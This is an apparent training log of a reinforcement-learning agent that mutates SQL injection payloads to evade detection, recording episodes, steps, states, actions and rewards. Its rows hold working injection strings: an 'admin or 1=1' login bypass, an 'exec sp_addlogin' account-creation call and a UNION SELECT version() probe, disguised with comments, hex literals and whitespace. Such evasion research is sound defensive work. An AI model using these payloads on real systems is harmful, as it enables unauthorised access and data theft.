;episode;step;original_payload;state;action;next_state;reward;win
55;2;26;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	/**/||	/**//**/OR/**/0x0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0#A3H45Ua
	/**/||	/**//**/OR/**/0x0#A3H45Ua
""""""""/**/OR/**/0x0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0#A3H45Ua
""""""";24;"""admin""""	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
""""""""/**/OR/**/0x0 OR 0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
""""""";0.0;0
56;2;27;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
""""""""/**/OR/**/0x0 OR 0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
""""""";2;"""admin""""	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
""""""""/**/OR/**/0x0 OR 0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
""""""";0.0;0
57;2;28;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
""""""""/**/OR/**/0x0 OR 0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
""""""";16;"""admin""""	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
""""""""/**/OR/**/0x0 OR 0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
""""""|";0.0;0
58;2;29;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
""""""""/**/OR/**/0x0 OR 0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
""""""|";12;"""admin""""	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
""""""""/**/OR/**/0x0 OR 0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
""""""|";0.0;0
59;2;30;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
""""""""/**/OR/**/0x0 OR 0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
""""""|";21;"""admin""""	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
""""""""/**/OR/**/0x0 OR 0#A3H45Ua
/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
""""""|";0.0;0
60;3;1;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";20;"""exec sp_addlogin 'name' , 'password'""";0.5428571497907445;0
61;3;2;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";11;"""exec sp_addlogin 'name' , 'password'""";0.7842105207680996;0
62;3;3;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";17;"""exec sp_addlogin 'name' , 'password'""";0.6842105207680995;0
63;3;4;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";16;"""exec sp_addlogin 'name' , 'password'""";0.5842105207680995;0
64;3;5;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";22;"""exec sp_addlogin 'name' , 'password'""";0.48421052076809956;0
65;3;6;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";8;"""exec sp_addlogin 'name' , 'password'""";0.3842105207680996;0
66;3;7;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";2;"""exec sp_addlogin 'name' , 'password'""";0.2842105207680995;0
67;3;8;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";8;"""exec sp_addlogin 'name' , 'password'""";0.18421052076809952;0
68;3;9;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";22;"""exec sp_addlogin 'name' , 'password'""";0.08421052076809954;0
69;3;10;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";20;"""exec sp_addlogin 'name' , 'password'""";0.0;0
70;3;11;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";3;"""exec sp_addlogin 'name' , 'password'""";0.0;0
71;3;12;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";24;"""exec sp_addlogin 'name' , 'password'""";0.0;0
72;3;13;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";18;"""exec sp_addlogin 'name' , 'password'""";0.0;0
73;3;14;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";4;"""exec sp_addlogin 'name' , 'password'""";0.0;0
74;3;15;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";19;"""exec sp_addlogin 'name' , 'password'""";0.0;0
75;3;16;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";20;"""exec sp_addlogin 'name' , 'password'""";0.0;0
76;3;17;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";22;"""exec sp_addlogin 'name' , 'password'""";0.0;0
77;3;18;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";22;"""exec sp_addlogin 'name' , 'password'""";0.0;0
78;3;19;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";14;"""exec#(1/lX~[
sp_addlogin#(1/lX~[
'name'#(1/lX~[
,#(1/lX~[
'password'""";0.17333334901597786;0
79;3;20;"""exec sp_addlogin 'name' , 'password'""";"""exec#(1/lX~[
sp_addlogin#(1/lX~[
'name'#(1/lX~[
,#(1/lX~[
'password'""";23;"""exec#(1/lX~[
sp_addlogin#(1/lX~[
'name'#(1/lX~[
,#(1/lX~[
'password'""";0.07333334901597777;0
80;3;21;"""exec sp_addlogin 'name' , 'password'""";"""exec#(1/lX~[
sp_addlogin#(1/lX~[
'name'#(1/lX~[
,#(1/lX~[
'password'""";9;"""exec#(1/lX~[
sp_addlogin#(1/lX~[
'name'#(1/lX~[
,#(1/lX~[
'password'""";0.0;0
81;3;22;"""exec sp_addlogin 'name' , 'password'""";"""exec#(1/lX~[
sp_addlogin#(1/lX~[
'name'#(1/lX~[
,#(1/lX~[
'password'""";2;"""exec#(1/lX~[
sp_addlogin#(1/lX~[
'name'#(1/lX~[
,#(1/lX~[
'password'""";0.0;0
82;3;23;"""exec sp_addlogin 'name' , 'password'""";"""exec#(1/lX~[
sp_addlogin#(1/lX~[
'name'#(1/lX~[
,#(1/lX~[
'password'""";24;"""exec OR 0#(1/lX~[
sp_addlogin OR 0#(1/lX~[
'name' OR 0#(1/lX~[
, OR 0#(1/lX~[
'password'""";0.0;0
83;3;24;"""exec sp_addlogin 'name' , 'password'""";"""exec OR 0#(1/lX~[
sp_addlogin OR 0#(1/lX~[
'name' OR 0#(1/lX~[
, OR 0#(1/lX~[
'password'""";13;"""exec  OR  0#(1/lX~[
sp_addlogin  OR  0#(1/lX~[
'name'  OR  0#(1/lX~[
,  OR  0#(1/lX~[
'password'""";0.0;0
84;3;25;"""exec sp_addlogin 'name' , 'password'""";"""exec  OR  0#(1/lX~[
sp_addlogin  OR  0#(1/lX~[
'name'  OR  0#(1/lX~[
,  OR  0#(1/lX~[
'password'""";14;"""exec#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0#(1/lX~[
sp_addlogin#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0#(1/lX~[
'name'#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0#(1/lX~[
,#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0#(1/lX~[
'password'""";3.7333333942625266;0
85;3;26;"""exec sp_addlogin 'name' , 'password'""";"""exec#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0#(1/lX~[
sp_addlogin#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0#(1/lX~[
'name'#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0#(1/lX~[
,#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0#(1/lX~[
'password'""";15;"""exec#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0#(1/lX~[
sp_addlogin#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0#(1/lX~[
'name'#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0#(1/lX~[
,#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0#(1/lX~[
'password'""";3.633333394262527;0
86;3;27;"""exec sp_addlogin 'name' , 'password'""";"""exec#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0#(1/lX~[
sp_addlogin#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0#(1/lX~[
'name'#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0#(1/lX~[
,#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0#(1/lX~[
'password'""";7;"""exec#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
sp_addlogin#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
'name'#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
,#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
'password'""";3.959999843597416;0
87;3;28;"""exec sp_addlogin 'name' , 'password'""";"""exec#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
sp_addlogin#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
'name'#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
,#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
'password'""";0;"""exec#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
sp_addlogin#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
'name'#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
,#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
'password'""";3.859999843597416;0
88;3;29;"""exec sp_addlogin 'name' , 'password'""";"""exec#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
sp_addlogin#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
'name'#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
,#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
'password'""";2;"""exec#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
sp_addlogin#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
'name'#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
,#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
'password'""";3.759999843597416;0
89;3;30;"""exec sp_addlogin 'name' , 'password'""";"""exec#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
sp_addlogin#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
'name'#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
,#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
'password'""";0;"""exec#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
sp_addlogin#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
'name'#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
,#?Vb@Q$b
#?Vb@Q$b
OR#?Vb@Q$b
#?Vb@Q$b
0x0#(0x1/lX~[
'password'""";3.659999843597416;0
90;4;1;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";13;"""  select  *  from  users  where  id  =  1  or  1#"""".  =  1  union  select  1,version  (    )    --  1""";1.030000029928983;0
91;4;2;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""  select  *  from  users  where  id  =  1  or  1#"""".  =  1  union  select  1,version  (    )    --  1""";23;"""  select  *  from  users  where  id  =  1  or  1#"""".  =  1  union  select  1,version  (    )    --  1""";0.9300000299289831;0
92;4;3;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""  select  *  from  users  where  id  =  1  or  1#"""".  =  1  union  select  1,version  (    )    --  1""";11;"""  select  *  from  users  where  id  =  1  or  1#"""".  =  1  union  select  1,version  (    )    --  1""";1.5058823050924666;0
93;4;4;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""  select  *  from  users  where  id  =  1  or  1#"""".  =  1  union  select  1,version  (    )    --  1""";1;"""  select  *  from  users  where  id  =  1  or  1#"""".  =  1  union  select  1,version  (    )    --  1""";1.4058823050924665;0
94;4;5;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""  select  *  from  users  where  id  =  1  or  1#"""".  =  1  union  select  1,version  (    )    --  1""";24;"""  select  *  from  users  where  id  =  1  or  1 OR 0#"""".  =  1  union  select  1,version  (    )    --  1""";1.2666667039195705;0
95;4;6;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""  select  *  from  users  where  id  =  1  or  1 OR 0#"""".  =  1  union  select  1,version  (    )    --  1""";3;"""  select  *  from  users  where  id  =  1  or  1 OR 0#"""".  =  1  union  select  1,version  (    )    --  1""";1.1666667039195706;0
96;4;7;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""  select  *  from  users  where  id  =  1  or  1 OR 0#"""".  =  1  union  select  1,version  (    )    --  1""";9;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 1	 	 or	 	 1	 OR	 0#"""".	 	 =	 	 1	 	 union	 	 select	 	 1,version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";2.274074210486137;0
97;4;8;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 1	 	 or	 	 1	 OR	 0#"""".	 	 =	 	 1	 	 union	 	 select	 	 1,version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";23;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 1	 	 or	 	 1	 OR	 0#"""".	 	 =	 	 1	 	 union	 	 select	 	 1,version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";2.174074210486137;0
98;4;9;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 1	 	 or	 	 1	 OR	 0#"""".	 	 =	 	 1	 	 union	 	 select	 	 1,version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";8;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	 or	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";0.8482758726557003;0
99;4;10;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	 or	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";6;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";0.762068961674124;0
100;4;11;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";4;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";0.662068961674124;0
101;4;12;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";22;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";0.5620689616741239;0
102;4;13;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";12;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";0.055913951127071204;0
103;4;14;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";11;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";0.3333333171076247;0
104;4;15;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";1;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";0.23333331710762462;0
105;4;16;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";23;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";0.13333331710762475;0
106;4;17;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";17;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";0.03333331710762466;0
107;4;18;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";18;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";0.0;0
108;4;19;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";16;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""W";0.0;0
